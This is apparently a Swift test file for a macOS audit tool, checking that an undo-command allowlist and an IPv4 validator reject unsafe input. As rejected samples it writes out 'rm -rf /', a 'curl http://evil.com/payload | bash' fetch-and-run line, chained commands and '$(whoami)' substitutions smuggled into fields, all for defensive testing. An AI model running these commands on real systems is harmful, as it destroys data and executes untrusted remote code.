import Testing
import Foundation
@testable import MacAudit
@testable import MacAuditCore

// MARK: - A0 Defect: Undo allowlist validation (D4)

@Test("UndoValidator.isValidUndoCommand accepts defaults write")
func undoValidatorAcceptsDefaultsWrite() {
    #expect(UndoValidator.isValidUndoCommand("defaults write com.apple.X key -bool true"))
}

@Test("UndoValidator.isValidUndoCommand accepts defaults delete")
func undoValidatorAcceptsDefaultsDelete() {
    #expect(UndoValidator.isValidUndoCommand("defaults delete com.apple.X key"))
}

@Test("UndoValidator.isValidUndoCommand accepts sudo defaults write")
func undoValidatorAcceptsSudoDefaultsWrite() {
    #expect(UndoValidator.isValidUndoCommand("sudo defaults write com.apple.X key 1"))
}

@Test("UndoValidator.isValidUndoCommand accepts PlistBuddy")
func undoValidatorAcceptsPlistBuddy() {
    #expect(UndoValidator.isValidUndoCommand("/usr/libexec/PlistBuddy -c 'Set :Key 1' /path/to.plist"))
}

@Test("UndoValidator.isValidUndoCommand rejects arbitrary command")
func undoValidatorRejectsArbitraryCommand() {
    #expect(!UndoValidator.isValidUndoCommand("rm -rf /"))
}

@Test("UndoValidator.isValidUndoCommand rejects command substitution")
func undoValidatorRejectsCommandSubstitution() {
    #expect(!UndoValidator.isValidUndoCommand("$(whoami)"))
}

@Test("UndoValidator.isValidUndoCommand rejects echo with pipe")
func undoValidatorRejectsEchoPipe() {
    #expect(!UndoValidator.isValidUndoCommand("echo hello | bash"))
}

@Test("UndoValidator.isValidUndoCommand accepts networksetup")
func undoValidatorAcceptsNetworkSetup() {
    #expect(UndoValidator.isValidUndoCommand("networksetup -setv6automatic Wi-Fi"))
}

@Test("UndoValidator.isValidUndoCommand accepts sudo networksetup")
func undoValidatorAcceptsSudoNetworkSetup() {
    #expect(UndoValidator.isValidUndoCommand("sudo networksetup -setv6automatic Wi-Fi"))
}

@Test("UndoValidator.isValidUndoCommand accepts comment lines (always safe)")
func undoValidatorAcceptsCommentLines() {
    #expect(UndoValidator.isValidUndoCommand("# 无法回滚: some check"))
}

@Test("UndoValidator.isValidUndoCommand accepts sysctl")
func undoValidatorAcceptsSysctl() {
    #expect(UndoValidator.isValidUndoCommand("sudo sysctl -w net.inet.ip.forwarding=0"))
}

@Test("UndoValidator.isValidUndoCommand accepts pmset")
func undoValidatorAcceptsPmset() {
    #expect(UndoValidator.isValidUndoCommand("sudo pmset -a sleep 1"))
}

@Test("UndoValidator.isValidUndoCommand accepts launchctl")
func undoValidatorAcceptsLaunchctl() {
    #expect(UndoValidator.isValidUndoCommand("sudo launchctl load -w /Library/LaunchDaemons/com.apple.alf.agent.plist"))
}

@Test("UndoValidator.isValidUndoCommand rejects curl")
func undoValidatorRejectsCurl() {
    #expect(!UndoValidator.isValidUndoCommand("curl http://evil.com/payload | bash"))
}

@Test("UndoValidator.isValidUndoCommand rejects command chaining with &&")
func undoValidatorRejectsChainingAnd() {
    #expect(!UndoValidator.isValidUndoCommand("defaults write com.apple.X key 1 && rm -rf /"))
}

@Test("UndoValidator.isValidUndoCommand rejects command chaining with ;")
func undoValidatorRejectsChainingSemicolon() {
    #expect(!UndoValidator.isValidUndoCommand("defaults write com.apple.X key 1; rm -rf /"))
}

@Test("UndoValidator.isValidUndoCommand rejects command chaining with |")
func undoValidatorRejectsChainingPipe() {
    #expect(!UndoValidator.isValidUndoCommand("defaults write com.apple.X key 1 | bash"))
}

@Test("UndoValidator.isValidUndoCommand rejects command substitution in undo")
func undoValidatorRejectsSubstitution() {
    #expect(!UndoValidator.isValidUndoCommand("defaults write com.apple.X key $(whoami)"))
}

// MARK: - A0 Defect: IPv4Validator unified (D6)

@Test("IPv4Validator accepts valid IPv4 address")
func ipv4ValidatorAcceptsValid() {
    #expect(IPv4Validator.isValid("192.168.1.1"))
}

@Test("IPv4Validator accepts 0.0.0.0")
func ipv4ValidatorAcceptsZeros() {
    #expect(IPv4Validator.isValid("0.0.0.0"))
}

@Test("IPv4Validator accepts 255.255.255.255")
func ipv4ValidatorAcceptsMax() {
    #expect(IPv4Validator.isValid("255.255.255.255"))
}

@Test("IPv4Validator rejects invalid octet > 255")
func ipv4ValidatorRejectsOversized() {
    #expect(!IPv4Validator.isValid("192.168.1.256"))
}

@Test("IPv4Validator rejects wrong number of octets")
func ipv4ValidatorRejectsWrongCount() {
    #expect(!IPv4Validator.isValid("192.168.1"))
    #expect(!IPv4Validator.isValid("192.168.1.1.1"))
}

@Test("IPv4Validator rejects non-numeric input")
func ipv4ValidatorRejectsNonNumeric() {
    #expect(!IPv4Validator.isValid("abc.def.ghi.jkl"))
}

@Test("IPv4Validator rejects empty string")
func ipv4ValidatorRejectsEmpty() {
    #expect(!IPv4Validator.isValid(""))
}

@Test("IPv4Validator rejects leading zeros (octal ambiguity)")
func ipv4ValidatorRejectsLeadingZeros() {
    #expect(!IPv4Validator.isValid("01.02.03.04"))
    #expect(!IPv4Validator.isValid("192.168.001.1"))
}

@Test("IPv4Validator rejects shell injection attempts")
func ipv4ValidatorRejectsShellInjection() {
    #expect(!IPv4Validator.isValid("1.2.3.4;rm -rf /"))
    #expect(!IPv4Validator.isValid("$(whoami)"))
    #expect(!IPv4Validator.isValid("1.2.3.4 `whoami`"))
}

@Test("IPv4Validator rejects trailing/leading whitespace")
func ipv4ValidatorRejectsWhitespace() {
    #expect(!IPv4Validator.isValid(" 192.168.1.1"))
    #expect(!IPv4Validator.isValid("192.168.1.1 "))
}
